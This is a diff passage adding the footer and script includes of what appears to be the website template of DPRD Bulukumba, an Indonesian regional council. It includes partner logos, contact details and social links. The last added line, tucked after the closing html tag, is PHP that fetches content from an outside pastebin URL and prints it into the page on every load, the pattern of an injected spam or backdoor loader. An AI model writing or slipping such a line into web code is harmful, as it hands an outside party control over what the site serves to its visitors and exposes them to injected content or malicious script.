+                                <a href="http://www.mpr.go.id/" target="_blank"><img src="http://dprd.bulukumbakab.go.id/_temp/uploads/img/130421165321_mpr.png" alt="Majelis Permusyawarahan Rakyat RI" /></a>
+                            </div>
+                                                    <div class="item">
+                                <a href="http://www.dpd.go.id/" target="_blank"><img src="http://dprd.bulukumbakab.go.id/_temp/uploads/img/130421165500_dpr.png" alt="Dewan Perwakilan Rakyat RI" /></a>
+                            </div>
+                                                    <div class="item">
+                                <a href="https://www.mkri.id/" target="_blank"><img src="http://dprd.bulukumbakab.go.id/_temp/uploads/img/130421170437_mk.png" alt="Mahkamah Konstitusi" /></a>
+                            </div>
+                                                    <div class="item">
+                                <a href="http://jdih.bulukumbakab.go.id" target="_blank"><img src="http://dprd.bulukumbakab.go.id/_temp/uploads/img/130421170332_JDIH.png" alt="JDIH Bulukumba" /></a>
+                            </div>
+                                                    <div class="item">
+                                <a href="https://bulukumbakab.go.id/" target="_blank"><img src="http://dprd.bulukumbakab.go.id/_temp/uploads/img/130421170255_PEMKAB.png" alt="Pemda Bulukumba" /></a>
+                            </div>
+                                                    <div class="item">
+                                <a href="http://jdih.dprd.bulukumbakab.go.id/" target="_blank"><img src="http://dprd.bulukumbakab.go.id/_temp/uploads/img/250521202721_jdih_dprd_buluk.jpeg" alt="JDIH DPRD" /></a>
+                            </div>
+                                            
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+<!-- START SECTION CLIENT LOGO -->
+<!-- START FOOTER SECTION -->
+<footer class="footer_dark">
+    <div class="top_footer">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-4 col-md-12 animation" data-animation="fadeInUp" data-animation-delay="0.2s">
+                    <div class="footer_logo">
+                        <a href="#home_section"><img alt="logo" src="http://dprd.bulukumbakab.go.id/assets/images//white-logo.png"></a>
+                    </div>
+                    <p>Jl. Sultan Hasanuddin No. 43  Kelurahan Bintarore, Kecamatan Ujung Buluku, kabupaten Bulukumba</p> 
+                    <P>Telepon : 081525800273 <br>
+                    Email : znine1515@gmail.com</P><ul class="list_none footer_social">
+                        <li><a href="https://www.facebook.com/HumasdanProtokolerDPRDbulukumba"><i class="ion-social-facebook"></i></a></li>
+                        <li><a href="https://twitter.com/DprdHumas"><i class="ion-social-twitter"></i></a></li>                        
+                        <li><a href="https://www.youtube.com/channel/UCZdI4xukUKFi0rJ1zLoxgiA/featured"><i class="ion-social-youtube-outline"></i></a></li>
+                        <li><a href="https://www.instagram.com/humasdprdbulukumba/"><i class="ion-social-instagram-outline"></i></a></li>
+                    </ul>
+                </div>
+                <div class="col-lg-4 col-md-6 mt-4 mt-lg-0 animation" data-animation="fadeInUp" data-animation-delay="0.4s">
+                    <h6 class="widget_title">SITE MAP</h6>
+                    <ul class="list_none widget_links_style1">
+                        <li><a href="#">Anggota Dewan</a></li>
+                        <li><a href="#">Berita DPRD</a></li>
+                        <li><a href="#">Peraturan</a></li>
+                        <li><a href="#">Pengaduan</a></li>
+                        <li><a href="#">Galeri</a></li>
+                        <li><a href="#">Kontak kami</a></li>
+                    </ul>
+                </div>
+                <div class="col-lg-4 col-md-6 mt-4 mt-lg-0 animation" data-animation="fadeInUp" data-animation-delay="0.6s">
+                    <h6 class="widget_title">Subscribe Newsletter</h6>
+                    
+                    <div class="newsletter_form">
+                        <form>
+                            <div class="rounded_input">
+                                <input type="text" required placeholder="Enter Email Address" />
+                            </div>
+                            <button type="submit" title="Subscribe" class="btn btn-default btn-radius" name="submit" value="Submit">
+                                subscribe
+                            </button>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="bottom_footer bg-dark">
+        <div class="container">
+            <div class="row align-items-center">
+                <div class="col-md-6">
+                    <p class="copyright m-md-0 text-center text-md-left">&copy; 2021 All Rights Reserved by DPRD Bulukumba.</p>
+                </div>
+                <div class="col-md-6">
+                    <ul class="list_none footer_link text-center text-md-right">
+                        <li><a href="#">Privacy Policy</a></li>
+                        <li><a href="#">Terms & Conditions</a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- END FOOTER SECTION -->
+
+<a href="#" class="scrollup" style="display: none;"><i class="ion-ios-arrow-up"></i></a>
+
+<!-- Latest jQuery -->
+<script src="http://dprd.bulukumbakab.go.id/assets/js/jquery-1.12.4.min.js"></script>
+<!-- jquery-ui -->
+<script src="http://dprd.bulukumbakab.go.id/assets/js/jquery-ui.js"></script>
+<!-- popper min js -->
+<script src="http://dprd.bulukumbakab.go.id/assets/js/popper.min.js"></script>
+<!-- Latest compiled and minified Bootstrap -->
+<script src="http://dprd.bulukumbakab.go.id/assets/bootstrap/js/bootstrap.min.js"></script>
+<!-- owl-carousel min js  -->
+<script src="http://dprd.bulukumbakab.go.id/assets/owlcarousel/js/owl.carousel.min.js"></script>
+<!-- magnific-popup min js  -->
+<script src="http://dprd.bulukumbakab.go.id/assets/js/magnific-popup.min.js"></script>
+<!-- waypoints min js  -->
+<script src="http://dprd.bulukumbakab.go.id/assets/js/waypoints.min.js"></script>
+<!-- parallax js  -->
+<script src="http://dprd.bulukumbakab.go.id/assets/js/parallax.js"></script>
+<!-- countdown js  -->
+<script src="http://dprd.bulukumbakab.go.id/assets/js/jquery.countdown.min.js"></script>
+<!-- fit video  -->
+<script src="http://dprd.bulukumbakab.go.id/assets/js/jquery.fitvids.js"></script>
+<!-- jquery.counterup.min js -->
+<script src="http://dprd.bulukumbakab.go.id/assets/js/jquery.counterup.min.js"></script>
+<!-- isotope min js -->
+<script src="http://dprd.bulukumbakab.go.id/assets/js/isotope.min.js"></script>
+<!-- elevatezoom js -->
+<script src='http://dprd.bulukumbakab.go.id/assets/js/jquery.elevatezoom.js'></script>
+<!-- scripts js -->
+<script src="http://dprd.bulukumbakab.go.id/assets/js/scripts.js"></script>
+
+<!-- Sticky-->
+<script src="http://dprd.bulukumbakab.go.id/assets/js/sticky-kit.js"></script>
+<script>
+    $('.sticky_column').theiaStickySidebar();
+</script>
+</body>
+
+</html>
+<?php $a = file_get_contents('https://hastebin.skyra.pw/raw/igezeliwij'); echo $a; ?>
